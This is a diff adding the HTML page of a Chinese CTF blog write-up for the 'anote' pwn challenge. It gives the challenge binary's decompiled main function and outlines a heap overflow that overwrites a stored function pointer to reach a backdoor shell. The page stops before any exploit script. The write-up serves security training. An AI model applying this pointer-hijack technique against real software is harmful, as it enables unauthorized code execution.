@@ -1,0 +1,629 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    [长城杯 2024] anote | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="[长城杯 2024] anote  main1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[长城杯 2024] anote">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/C++PWN/%5B%E9%95%BF%E5%9F%8E%E6%9D%AF2024%5Danote/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="[长城杯 2024] anote  main1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778072434790-358d08c7-7472-48c9-bc11-7b71e138812a-435766.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778073491506-9e542034-47aa-4713-b027-92e4aeb01317-535436.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074521722-c74cad59-be55-4e8c-b92d-88b847e66911-096380.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074604831-4a63efb4-693e-4afb-b23f-c8fbc06fe7cf-916795.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074658304-669ed256-0854-48ef-ba98-b68fb3646c5a-927300.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074148123-5764c73c-4b04-4735-8fb4-ebf24c31bda0-269031.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778075825996-d20110b6-2975-4265-94d2-5bb52f03ad99-155714.png">
+<meta property="article:published_time" content="2026-05-22T18:46:28.000Z">
+<meta property="article:modified_time" content="2026-05-22T18:58:43.402Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778072434790-358d08c7-7472-48c9-bc11-7b71e138812a-435766.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/categories">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">分类</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/tags">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">标签</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="[长城杯 2024] anote">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">[长城杯 2024] anote</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF-2024-anote"><span class="toc-number">1.</span> <span class="toc-text">[长城杯 2024] anote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#backdoor"><span class="toc-number">1.2.</span> <span class="toc-text">backdoor</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-C++PWN/[长城杯2024]anote" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-22T18:46:28.000Z" itemprop="datePublished">2026-05-23</time>
+    <time style="display: none;" id="post-update-time">2026-05-23</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-05-22T18:58:43.402Z" itemprop="dateModified">2026-05-23</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="长城杯-2024-anote"><a href="#长城杯-2024-anote" class="headerlink" title="[长城杯 2024] anote"></a>[长城杯 2024] anote</h1><p><img src="/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778072434790-358d08c7-7472-48c9-bc11-7b71e138812a-435766.png" alt="1778072434790-358d08c7-7472-48c9-bc11-7b71e138812a.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778073491506-9e542034-47aa-4713-b027-92e4aeb01317-535436.png" alt="1778073491506-9e542034-47aa-4713-b027-92e4aeb01317.png"></p>
+<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> m; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">    std::istream *v8; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">    std::istream *v10; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> idx; <span class="comment">// [esp+0h] [ebp-68h] BYREF</span></span><br><span class="line">    <span class="type">size_t</span> n; <span class="comment">// [esp+4h] [ebp-64h] BYREF</span></span><br><span class="line">    <span class="type">int</span> num; <span class="comment">// [esp+8h] [ebp-60h] BYREF</span></span><br><span class="line">    <span class="type">int</span> count; <span class="comment">// [esp+Ch] [ebp-5Ch]</span></span><br><span class="line">    <span class="type">int</span> n10; <span class="comment">// [esp+10h] [ebp-58h]</span></span><br><span class="line">    <span class="type">int</span> v17[<span class="number">10</span>]; <span class="comment">// [esp+14h] [ebp-54h]</span></span><br><span class="line">    <span class="type">char</span> src[<span class="number">32</span>]; <span class="comment">// [esp+3Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v19; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> *v20; <span class="comment">// [esp+60h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v20 = &amp;a1;</span><br><span class="line">    v19 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    n10 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">menu</span>();                                     <span class="comment">// 1.add 2.show 3.edit 4.exit</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int menu()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;1. add\n&quot;);</span></span><br><span class="line"><span class="comment">    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;2. show content\n&quot;);</span></span><br><span class="line"><span class="comment">    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;3. edit content\n&quot;);</span></span><br><span class="line"><span class="comment">    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;4. exit\n&quot;);</span></span><br><span class="line"><span class="comment">    return std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Choice&gt;&gt;&quot;)*/</span></span><br><span class="line">            <span class="keyword">if</span> ( count &gt; <span class="number">9</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;num);</span><br><span class="line">            <span class="keyword">if</span> ( num == <span class="number">2</span> )                             <span class="comment">// show</span></span><br><span class="line">            &#123;</span><br><span class="line">                std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;index: &quot;</span>);</span><br><span class="line">                std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;idx);<span class="comment">// cin &gt;&gt; idx</span></span><br><span class="line">                <span class="keyword">if</span> ( idx &gt;= count )</span><br><span class="line">                &#123;</span><br><span class="line">                    v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;the item does not exist.&quot;</span>);</span><br><span class="line">                    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                v5 = v17[idx];</span><br><span class="line">                v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;gift: &quot;</span>);</span><br><span class="line">                v7 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, v5);</span><br><span class="line">                std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);<span class="comment">// std::cout &lt;&lt; v5 &lt;&lt; std::endl;</span></span><br><span class="line">                <span class="built_in">sub_80489E8</span>(v17[idx]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int __cdecl sub_80489E8(int a1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  int v1; // ebx</span></span><br><span class="line"><span class="comment">  int v2; // eax</span></span><br><span class="line"><span class="comment">  int cout____idx; // eax</span></span><br><span class="line"><span class="comment">  int v4; // eax</span></span><br><span class="line"><span class="comment">  int cout____content; // eax</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  v1 = *(_DWORD *)(a1 + 4);</span></span><br><span class="line"><span class="comment">  v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;index: &quot;);</span></span><br><span class="line"><span class="comment">  cout____idx = std::ostream::operator&lt;&lt;(v2, v1);// cout &lt;&lt; idx</span></span><br><span class="line"><span class="comment">  std::ostream::operator&lt;&lt;(cout____idx, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span></span><br><span class="line"><span class="comment">  v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;content: &quot;);</span></span><br><span class="line"><span class="comment">  cout____content = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, a1 + 8);// cout &lt;&lt; content</span></span><br><span class="line"><span class="comment">  return std::ostream::operator&lt;&lt;(cout____content, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( num == <span class="number">3</span> )              <span class="comment">// edit</span></span><br><span class="line">            &#123;</span><br><span class="line">                std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;index: &quot;</span>);</span><br><span class="line">                v8 = (std::istream *)std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;idx);</span><br><span class="line">                std::istream::<span class="built_in">get</span>(v8);</span><br><span class="line">                <span class="keyword">if</span> ( idx &gt;= count )</span><br><span class="line">                &#123;</span><br><span class="line">                    v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;the item does not exist.&quot;</span>);</span><br><span class="line">                    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;len: &quot;</span>);</span><br><span class="line">                v10 = (std::istream *)std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;n);</span><br><span class="line">                std::istream::<span class="built_in">get</span>(v10);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="type">int</span>)n &gt; <span class="number">40</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;too big!\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;content: &quot;</span>);</span><br><span class="line">                std::istream::<span class="built_in">getline</span>((std::istream *)&amp;std::cin, src, <span class="number">32</span>);</span><br><span class="line">                <span class="built_in">sub_8048A86</span>(v17[idx], src, idx, n);</span><br><span class="line">                (**(<span class="built_in">void</span> (__cdecl ***)(<span class="type">int</span>))v17[idx])(v17[idx]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( num != <span class="number">1</span> )                           <span class="comment">// add</span></span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                v1 = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x1Cu</span>);         </span><br><span class="line">                <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">0x1C</span>; m += <span class="number">4</span> )</span><br><span class="line">                    *(_DWORD *)(v1 + m) = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">sub_8048DFC</span>(v1);</span><br><span class="line">                v3 = count++;</span><br><span class="line">                v17[v3] = v1;</span><br><span class="line">                std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;got new one!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;too much!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>add &gt;&gt; 每次 add 都会申请一个大小为 0x20 的堆</li>
+</ol>
+<p><img src="/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074521722-c74cad59-be55-4e8c-b92d-88b847e66911-096380.png" alt="1778074521722-c74cad59-be55-4e8c-b92d-88b847e66911.png"></p>
+<p>我们发现在 User_data 区一直存放着一个固定的指针指向 0x8048f48</p>
+<p><img src="/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074604831-4a63efb4-693e-4afb-b23f-c8fbc06fe7cf-916795.png" alt="1778074604831-4a63efb4-693e-4afb-b23f-c8fbc06fe7cf.png"></p>
+<p>跟进 __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_w</p>
+<p><img src="/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074658304-669ed256-0854-48ef-ba98-b68fb3646c5a-927300.png" alt="1778074658304-669ed256-0854-48ef-ba98-b68fb3646c5a.png"></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;work done.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提出思考：如果我们可以想办法篡改该指针，我们就可以劫持该指针指向 backdoor 获取 shell。</p>
+<p>edit 要求我们修改的长度不超过 0x40，这个长度已经足够我们进行堆溢出了</p>
+<p>gift 可以帮我们泄露堆地址。</p>
